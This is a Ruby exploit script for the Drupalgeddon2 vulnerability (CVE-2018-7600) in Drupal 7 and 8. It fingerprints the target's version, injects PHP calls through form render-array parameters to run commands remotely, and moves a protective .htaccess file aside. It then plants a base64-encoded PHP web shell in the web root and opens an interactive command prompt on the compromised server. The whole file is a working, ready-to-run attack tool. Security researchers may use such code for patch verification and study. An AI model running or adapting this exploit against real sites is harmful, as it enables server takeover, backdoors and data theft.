#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#


require "base64"
require "json"
require "net/http"
require "openssl"
require "readline"


# Settings - Proxy information (nil to disable)
proxy_addr = nil
proxy_port = 8080


# Settings - General
$useragent = "drupalgeddon2"
webshell = "s.php"
try_phpshell = true


# Settings - Payload (we could just be happy without this, but we can do better!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Function http_request <url> [type] [data]
def http_request(url, type="post", payload="")
  uri = URI(url)
  request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
  request.initialize_http_header({"User-Agent" => $useragent})
  request.body = payload
  return $http.request(request)
end


# Function gen_evil_url <cmd> [phpfunction] [shell]
def gen_evil_url(evil, phpfunction="passthru", shell=false)
  # PHP function to use (don't forget about disabled functions...)
  #phpfunction = $drupalverion.start_with?("8")? "exec" : "passthru"

  #puts "[i] PHP cmd: #{phpfunction}" if shell
  puts "[i] Payload: #{evil}" if not shell

  ## Check the version to match the payload
  # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  if $drupalverion.start_with?("8")
    # Method #1 - Drupal 8, mail, #post_render - response is 200
    url = $target + "#{$clean_url}#{$form}?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

    # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
    #url = $target + "#{$form}%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
  elsif $drupalverion.start_with?("7")
    # Method #3 - Drupal 7, name, #post_render - response is 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  else
    puts "[!] Unsupported Drupal version"
    exit
  end

  # Drupal v7.x needs an extra value from a form
  if $drupalverion.start_with?("7")
    response = http_request(url, "post", payload)

    form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
    puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
    #puts "[i] Form ID: #{$form_build_id}" if not shell

    url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_build_id
    #url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_build_id
    payload = "form_build_id=" + form_build_id
  end

  return url, payload
end


# Function clean_result <input>
def clean_result(input)
  #result = JSON.pretty_generate(JSON[response.body])
  #result = $drupalverion.start_with?("8")? JSON.parse(input)[0]["data"] : input
  result = input
  #result.slice!(/^\[{"command":".*}\]$/)
  result.slice!(/\[{"command":".*}\]$/)
  return result
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Quick how to use
if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target>"
  puts "       ruby drupalgeddon2.rb https://example.com"
  exit
end
# Read in values
$target = ARGV[0]


# Check input for protocol
if not $target.start_with?("http")
  $target = "http://#{$target}"
end
# Check input for the end
if not $target.end_with?("/")
  $target += "/"
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Banner
puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80
puts "[i] Target : #{$target}"
puts "[i] Proxy  : #{proxy_addr}:#{proxy_port}" if not proxy_addr.nil?
puts "[i] Write? : Skipping writing web shell" if not try_phpshell
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)


# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Try and get version
$drupalverion = ""
# Possible URLs
url = [
  # Drupal 6 / 7 / 8
  $target + "CHANGELOG.txt",
  $target + "core/CHANGELOG.txt",
  # Drupal 6+7 / 8
  $target + "includes/bootstrap.inc",
  $target + "core/includes/bootstrap.inc",
  # Drupal 6 / 7 / 8
  $target + "includes/database.inc",
  #$target + "includes/database/database.inc",
  #$target + "core/includes/database.inc",
]
# Check all
url.each do|uri|
  # Check response
  response = http_request(uri)

  if response.code == "200"
    puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"

    # Patched already? (For Drupal v8.4.x/v7.x)
    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"

    # Try and get version from the file contents (For Drupal v8.4.x/v7.x)
    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
    $drupalverion = "" if not $drupalverion[-1] =~ /\d/

    # If not, try and get it from the URL (For Drupal v6.x)
    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
    # If not, try and get it from the URL (For Drupal v8.5.x)
    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?

    # Done!
    break
  elsif response.code == "403"
    puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"

    # Get version from URL
    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
  else
    puts "[!] MISSING: #{uri}    (HTTP Response: #{response.code})"
  end
end


# Feedback
if $drupalverion
  status = $drupalverion.end_with?("x")? "?" : "!"
  puts "[+] Drupal#{status}: v#{$drupalverion}"
else
  puts "[!] Didn't detect Drupal version"
  exit
end
if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
  puts "[!] Unsupported Drupal version"
  exit
end
puts "-"*80




# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -



# The attack vector to use
$form = $drupalverion.start_with?("8")? "user/register" : "user/password"
# Make a request, check for form
url = "#{$target}?q=#{$form}"
puts "[*] Testing: Form   (#{$form})"
response = http_request(url)
if response.code == "200" and not response.body.empty?
  puts "[+] Result : Form valid"
elsif response.code == "404"
  puts "[!] Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?"
  exit
elsif response.code == "403"
  puts "[!] Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form disabled?"
  exit
elsif response.body.empty?
  puts "[!] Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"
  exit
else
  puts "[!] Target is NOT exploitable [1] (HTTP Response: #{response.code})"
end


puts "- "*40


# Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register
# Drupal v7.x needs it anyway
$clean_url = $drupalverion.start_with?("8")? "" : "?q="
url = "#{$target}#{$form}"
puts "[*] Testing: Clean URLs"
response = http_request(url)
if response.code == "200" and not response.body.empty?
  puts "[+] Result : Clean URLs enabled"
else
  $clean_url = "?q="
  puts "[-] Result : Clean URLs disabled"

  # Drupal v8.x needs it to be enabled
  if $drupalverion.start_with?("8")
    puts "[!] Sorry dave... NOPE NOPE NOPE"
    exit
  elsif $drupalverion.start_with?("7")
    puts "[i] Isn't an issue for Drupal v7.x"
  end
end
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -



# Make a request, testing code execution
puts "[*] Testing: Code Execution"
# Generate a random string to see if we can echo it
random = (0...8).map { (65 + rand(26)).chr }.join
url, payload = gen_evil_url("echo #{random}")
response = http_request(url, "post", payload)
if response.code == "200" and not response.body.empty?
  result = clean_result(response.body)
  if not result.empty?
    puts "[+] Result : #{result}"

    if response.body.match(/#{random}/)
      puts "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!"
    else
      puts "[!] WARNING: Target MIGHT to be exploitable [1]...   Detected output, but didn't MATCH expected result"
      #puts response.body
    end
  else
    puts "[!] WARNING: Target MIGHT to be exploitable [2]...   Didn't detect ANY output (disabled PHP function?)"
  end
elsif response.body.empty?
  puts "[!] Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"
  exit
else
  puts "[!] Target is NOT exploitable [1] (HTTP Response: #{response.code})"
  #puts response.body
  exit
end
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Location of web shell & used to signal if using PHP shell
webshellpath = nil
prompt = "drupalgeddon2"
# Possibles paths to try
paths = [
  # Web root
  "",
  # Required for setup
  "sites/default/",
  "sites/default/files/",
  # They did something "wrong", chmod -R 0777 .
  #"core/",
]
# Check all (if doing web shell)
paths.each do|path|
  folder = path.empty? ? "./" : path
  puts "[*] Testing: Writing To Web Root   (#{folder})"

  # Merge locations
  webshellpath = "#{path}#{webshell}"

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}"


  # By default, Drupal v7.x disables the PHP engine entirely in: ./sites/default/files/.htaccess
  # ...however Drupal v8.x disables the PHP engine using: ./.htaccess
  if path == "sites/default/files/"
    puts "[*] Moving : ./sites/default/files/.htaccess"
    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
  end

  # Generate evil URLs
  url, payload = gen_evil_url(cmd)
  # Make the request
  response = http_request(url, "post", payload)
  # Check result
  if response.code == "200" and not response.body.empty?
    # Feedback
    result = clean_result(response.body)
    puts "[+] Result : #{result}" if not response.body.empty?

    # Test to see if backdoor is there (if we managed to write it)
    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname")
    if response.code == "200" and not response.body.empty?
      puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
      break
    elsif response.code == "404"
      puts "[!] Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?"
    elsif response.code == "403"
      puts "[!] Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"
    elsif response.body.empty?
      puts "[!] Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back"
    else
      puts "[!] Target is NOT exploitable [2-1] (HTTP Response: #{response.code})"
      #puts response.body
    end
  elsif response.code == "404"
      puts "[!] Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?"
  elsif response.code == "403"
      puts "[!] Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"
  elsif response.body.empty?
    puts "[!] Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back"
  else
    puts "[!] Target is NOT exploitable [1-1] (HTTP Response: #{response.code})"
    #puts response.body
  end
  webshellpath = nil

  puts "- "*40 if path != paths.last
end if try_phpshell

# If a web path was set, we exploited using PHP!
if webshellpath
  # Get hostname for the prompt
  prompt = response.body.to_s.strip

  # Feedback
  puts "-"*80
  puts "[i] Fake shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'"
# Should we be trying to call commands via PHP?
elsif try_phpshell
  puts "[!] FAILED : Couldn't find writeable web path"
  puts "-"*80
  puts "[*] Dropping back to direct commands"
end


# Stop any CTRL + C action ;)
trap("INT", "SIG_IGN")


# Forever loop
loop do
  # Default value
  result = "~ERROR~"

  # Get input
  command = Readline.readline("#{prompt}>> ", true).to_s

  # Exit
  break if command =~ /exit/

  # Blank link?
  next if command.empty?

  # If PHP shell
  if webshellpath
    # Send request
    result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
  # Direct commands
  else
    url, payload = gen_evil_url(command, "passthru", true)
    response = http_request(url, "post", payload)

    # Check result
    if response.code == "200" and not response.body.empty?
      result = clean_result(response.body)
    end
  end

  # Feedback
  puts result
end
